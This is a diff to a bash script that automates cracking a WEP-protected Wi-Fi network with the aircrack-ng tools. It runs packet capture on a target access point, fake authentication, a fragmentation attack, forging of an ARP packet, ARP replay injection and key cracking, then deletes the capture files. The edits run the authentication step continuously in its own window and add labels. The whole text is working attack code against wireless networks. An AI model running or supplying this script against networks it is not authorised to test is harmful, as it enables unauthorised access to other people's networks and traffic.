@@ -79,16 +79,16 @@ fi
 # START AIRODUMP IN XTERM WINDOW
 #################################################################
 echo "MESSAGE: Starting packet capture - Ctrl-c to end it"
-xterm -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} --ivs -w capture ${INTERFACE}" & AIRODUMPPID=$!
+xterm -title "Packet capture for cracking" -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w capture ${INTERFACE}" & AIRODUMPPID=$!
 sleep 2
 
 #################################################################
 # ASSOCIATE WITH AP & THEN PERFORM FRAGMENTATION ATTACK
 #################################################################
-aireplay-ng -1 0 -a ${BSSID} -h ${MACADDRESS} ${INTERFACE}
+xterm -title "Authentication process" -e "aireplay-ng -1 6000 -q 10 -a ${BSSID} -h ${MACADDRESS} ${INTERFACE}" & AIREPLAYAUTHPID=$!
 aireplay-ng -5 -b ${BSSID} -h ${MACADDRESS} ${INTERFACE}
 packetforge-ng -0 -a ${BSSID} -h ${MACADDRESS} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet ${INTERFACE}
-xterm -e "aireplay-ng -2 -r arp-packet ${INTERFACE}" & AIREPLAYPID=$!
+xterm -title "ARP injection" -e "aireplay-ng -2 -r arp-packet ${INTERFACE}" & AIREPLAYPID=$!
 
 #################################################################
 # ATTEMPTING TO CRACK
@@ -110,6 +110,7 @@ done
 #################################################################
 kill ${AIRODUMPPID}
 kill ${AIREPLAYPID}
+kill ${AIREPLAYAUTHPID}
 airmon-ng stop ${INTERFACE}
 rm *.ivs *.cap *.xor
 exit 0
